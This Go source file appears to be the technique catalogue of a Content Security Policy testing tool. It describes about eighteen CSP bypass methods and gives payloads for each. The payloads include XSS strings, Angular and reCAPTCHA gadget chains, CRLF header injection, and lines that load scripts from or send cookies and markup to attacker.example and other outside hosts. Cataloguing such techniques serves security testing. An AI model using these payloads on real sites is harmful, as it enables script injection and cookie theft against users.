package csp

func init() {
	for key, technique := range extraTechniques {
		techniqueKB[key] = technique
	}
	techniqueOrder = append(techniqueOrder, extraOrder...)
}

var extraOrder = []string{
	"blob_uri",
	"angular_dom",
	"angular_library_gadgets",
	"unsafe_hashes",
	"iframe_csp_restriction",
	"csp_report_exfil",
	"header_injection",
	"php_header_strip",
	"error_page_rewrite",
	"bookmarklet",
	"browser_cve_2020_6519",
	"google_recaptcha_gadget",
	"analytics_gadgets",
	"wildcard_subdomain_takeover",
	"frame_ancestors",
	"dangling_markup",
	"trusted_types_report_only",
	"frame_src_allowlist",
}

var extraTechniques = map[string]Technique{
	"blob_uri": {
		Key:         "blob_uri",
		Name:        "blob: script source",
		Description: "script-src allows blob: URLs. An allowed script (or allowed inline script) creates a Blob containing JavaScript and loads it via a blob: URL, bypassing host allowlists.",
		Payloads: []string{
			`<script>var b=new Blob(["alert(1)"],{type:"text/javascript"});var s=document.createElement("script");s.src=URL.createObjectURL(b);document.body.appendChild(s)</script>`,
		},
		References: []string{refHackTricks},
	},
	"angular_dom": {
		Key:         "angular_dom",
		Name:        "AngularJS already present in the page",
		Description: "AngularJS is loaded by the application. Injecting an Angular template with ng-app/ng-csp executes expressions through Angular's parser (no inline script or eval needed), bypassing script-src.",
		Payloads: []string{
			`<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`,
			`<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`,
			`<div ng-app><strong class="ng-init:constructor.constructor('alert(1)')()">x</strong></div>`,
		},
		References: []string{refHuli, refHackTricks},
	},
	"angular_library_gadgets": {
		Key:         "angular_library_gadgets",
		Name:        "Angular + library functions returning window",
		Description: "An allowlisted CDN can load Angular plus libraries whose methods return the window object (Prototype, MooTools). Angular expressions can call those methods to escape sandboxing and execute code despite CSP.",
		Payloads: []string{
			`<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>`,
			`<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{[].erase.call().alert('xss')}}</div>`,
		},
		References: []string{refHuli, refHackTricks},
	},
	"unsafe_hashes": {
		Key:         "unsafe_hashes",
		Name:        "'unsafe-hashes' with hashed inline handlers",
		Description: "'unsafe-hashes' allows inline event handlers whose exact source matches a listed hash. Existing hashed handlers can be reused, and any attacker input reaching a hashed handler template executes with CSP approval.",
		Payloads: []string{
			`<img src=x onerror=alert(1)>`,
			`<button onclick="alert(1)">x</button>`,
		},
		References: []string{refHackTricks, refCSPEval},
	},
	"iframe_csp_restriction": {
		Key:         "iframe_csp_restriction",
		Name:        "Iframe CSP restriction (CTF technique)",
		Description: "In some applications an injected iframe can set the `csp` attribute to make a child document more restrictive, disabling a script that normally prevents a gadget (prototype pollution/DOM clobbering) and enabling arbitrary script loading.",
		Payloads: []string{
			`<iframe src="/view/item" csp="script-src 'self' 'unsafe-inline' 'unsafe-eval'"></iframe>`,
		},
		References: []string{refHackTricks},
	},
	"csp_report_exfil": {
		Key:         "csp_report_exfil",
		Name:        "CSP reporting exfiltration",
		Description: "If report-uri/report-to (or Report-Only CSP) points to a controllable endpoint, wrap sensitive data in a blocked script tag to trigger a violation report containing the snippet/data at the attacker endpoint.",
		Payloads: []string{
			`<script>SECRET_DATA_HERE</script>`,
		},
		References: []string{refHackTricks},
	},
	"header_injection": {
		Key:         "header_injection",
		Name:        "CSP header injection / response splitting",
		Description: "If user input is reflected into response headers, CRLF injection can add or override Content-Security-Policy (or inject a Report-Only policy pointing at an attacker). Check for duplicated or controllable CSP headers.",
		Payloads: []string{
			`%0d%0aContent-Security-Policy:%20script-src%20'unsafe-inline'`,
			`%0d%0aContent-Security-Policy-Report-Only:%20default-src%20https://attacker.example`,
		},
		References: []string{refHackTricks},
	},
	"php_header_strip": {
		Key:         "php_header_strip",
		Name:        "PHP header stripping (max_input_vars / output buffering)",
		Description: "PHP stops sending header() calls after output has started. Oversized requests (e.g. exceeding max_input_vars) or buffered warnings can trigger 'headers already sent', dropping the CSP header entirely so normal payloads execute.",
		Payloads: []string{
			`?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000`,
		},
		References: []string{refHackTricks},
	},
	"error_page_rewrite": {
		Key:         "error_page_rewrite",
		Name:        "Error page rewrite / window.open gadget",
		Description: "Some servers return a CSP-less error page. Open it with a long URL (often >4 KB), wait for the error document, then rewrite its body with an executable payload from the opener.",
		Payloads: []string{
			`a=window.open("/"+"x".repeat(4100));setTimeout(function(){a.document.body.innerHTML="<img src=x onerror=alert(1)>"},1000)`,
		},
		References: []string{refHackTricks},
	},
	"bookmarklet": {
		Key:         "bookmarklet",
		Name:        "Bookmarklet social engineering",
		Description: "CSP does not apply to user-initiated javascript: bookmarklets. Convincing a victim to drag/drop or click a bookmarklet executes arbitrary JavaScript in the current page context (requires user interaction).",
		Payloads: []string{
			`javascript:alert(document.domain)`,
		},
		References: []string{refHackTricks},
	},
	"browser_cve_2020_6519": {
		Key:         "browser_cve_2020_6519",
		Name:        "Chromium iframe javascript: bug (CVE-2020-6519)",
		Description: "A legacy Chromium bug allowed javascript: URLs in iframe src to execute despite CSP. Mostly fixed; relevant for old embedded browsers.",
		Payloads: []string{
			`<iframe src='javascript:var s=document.createElement("script");s.src="https://attacker.example/x.js";document.body.appendChild(s);'></iframe>`,
		},
		References: []string{"https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/"},
	},
	"google_recaptcha_gadget": {
		Key:         "google_recaptcha_gadget",
		Name:        "Google reCAPTCHA script gadget",
		Description: "If google.com is allowlisted, reCAPTCHA's main.min.js can be combined with Angular directives to access the window object and execute code, bypassing CSP.",
		Payloads: []string{
			`<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script><img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">`,
			`<div ng-controller="CarouselController as c" ng-init="c.init()">[[c.element.ownerDocument.defaultView.parent.location='https://google.com?'+c.element.ownerDocument.cookie]]<div carousel><div slides></div></div></div>`,
		},
		References: []string{refHackTricks},
	},
	"analytics_gadgets": {
		Key:         "analytics_gadgets",
		Name:        "Analytics / tracking script gadgets (exfiltration)",
		Description: "Allowed analytics SDKs (Google Tag Manager, GA, Facebook Pixel, Hotjar) often expose global functions that can send attacker-controlled events or payloads to an attacker-owned property. This is primarily a data-exfiltration bypass.",
		Payloads: []string{
			`gtag('event','x',{data:document.cookie})`,
			`fbq('trackCustom','leak',{data:document.cookie})`,
		},
		References: []string{refHackTricks},
	},
	"wildcard_subdomain_takeover": {
		Key:         "wildcard_subdomain_takeover",
		Name:        "Wildcard subdomain + takeover/JSONP",
		Description: "A wildcard host (e.g. *.example.com) is allowlisted. Find a subdomain that resolves to a third-party service you can claim (subdomain takeover) or a JSONP endpoint on any subdomain; scripts from it satisfy CSP.",
		Payloads: []string{
			`<script src="https://takeover.example.com/x.js"></script>`,
			`<script src="https://jsonp.example.com/api?callback=alert(1)//"></script>`,
		},
		References: []string{refHackTricks, refJSONBee},
	},
	"frame_ancestors": {
		Key:         "frame_ancestors",
		Name:        "Missing frame-ancestors (clickjacking)",
		Description: "frame-ancestors is absent, so an attacker page can frame the target. Combined with UI redress, clickjacking can trigger privileged actions; not a script-injection bypass but often part of CSP posture.",
		Payloads: []string{
			`<iframe src="https://target.example/" style="opacity:0.1;position:absolute;inset:0;width:100vw;height:100vh"></iframe>`,
		},
		References: []string{refOWASP},
	},
	"dangling_markup": {
		Key:         "dangling_markup",
		Name:        "Dangling markup injection",
		Description: "When base-uri and form-action protections are incomplete, dangling markup (unclosed tags that swallow following markup) can exfiltrate data via image/URL requests without executing JavaScript. Often chained with CSP.",
		Payloads: []string{
			`<img src="https://attacker.example/?x='`,
			`<base href="https://attacker.example/">`,
		},
		References: []string{refHackTricks, refOWASP},
	},
	"trusted_types_report_only": {
		Key:         "trusted_types_report_only",
		Name:        "Trusted Types in Report-Only mode",
		Description: "require-trusted-types-for is delivered only via a Report-Only policy. DOM XSS sinks are not blocked; payloads assigned to innerHTML etc. execute while violations are only reported.",
		Payloads: []string{
			`document.body.innerHTML='<img src=x onerror=alert(1)>'`,
		},
		References: []string{refHackTricks, refOWASP},
	},
	"frame_src_allowlist": {
		Key:         "frame_src_allowlist",
		Name:        "Allowed iframe host under attacker control",
		Description: "frame-src/child-src/default-src allows a host where an attacker can host a page (cloud hosting, takeover, JSONP). The framed page executes its own JavaScript; combined with postMessage/clickjacking it can affect the parent origin.",
		Payloads: []string{
			`<iframe src="https://attacker.example/frame.html" allow="clipboard-write"></iframe>`,
		},
		References: []string{refHackTricks},
	},
}

// techniqueCategories groups techniques for the --show-csp output.
var techniqueCategories = map[string]string{
	"no_csp":                      "Policy absence & monitoring",
	"report_only":                 "Policy absence & monitoring",
	"unsafe_inline":               "Inline & eval",
	"unsafe_eval":                 "Inline & eval",
	"unsafe_hashes":               "Inline & eval",
	"nonce_reuse":                 "Nonce / strict-dynamic",
	"strict_dynamic":              "Nonce / strict-dynamic",
	"wildcard":                    "Allowlist bypass",
	"wildcard_subdomain_takeover": "Allowlist bypass",
	"jsonp":                       "Allowlist bypass",
	"angular_cdn":                 "Allowlist bypass",
	"angular_dom":                 "Allowlist bypass",
	"angular_library_gadgets":     "Allowlist bypass",
	"third_party":                 "Allowlist bypass",
	"self_upload":                 "Allowlist bypass",
	"path_redirect":               "Allowlist bypass",
	"frame_src_allowlist":         "Allowlist bypass",
	"data_uri":                    "Source schemes",
	"blob_uri":                    "Source schemes",
	"base_uri":                    "Directive gaps",
	"object_src":                  "Directive gaps",
	"form_action":                 "Directive gaps",
	"frame_ancestors":             "Directive gaps",
	"dangling_markup":             "Directive gaps",
	"policy_injection":            "Injection",
	"header_injection":            "Injection",
	"dom_xss":                     "DOM & workers",
	"service_worker":              "DOM & workers",
	"trusted_types":               "DOM & workers",
	"trusted_types_report_only":   "DOM & workers",
	"php_header_strip":            "Server & browser quirks",
	"error_page_rewrite":          "Server & browser quirks",
	"bookmarklet":                 "Server & browser quirks",
	"browser_cve_2020_6519":       "Server & browser quirks",
	"iframe_csp_restriction":      "Server & browser quirks",
	"csp_report_exfil":            "Server & browser quirks",
	"google_recaptcha_gadget":     "Third-party gadgets",
	"analytics_gadgets":           "Third-party gadgets",
}

// CategoryFor returns the display category of a technique.
func CategoryFor(key string) string {
	if category, ok := techniqueCategories[key]; ok {
		return category
	}
	return "Other"
}
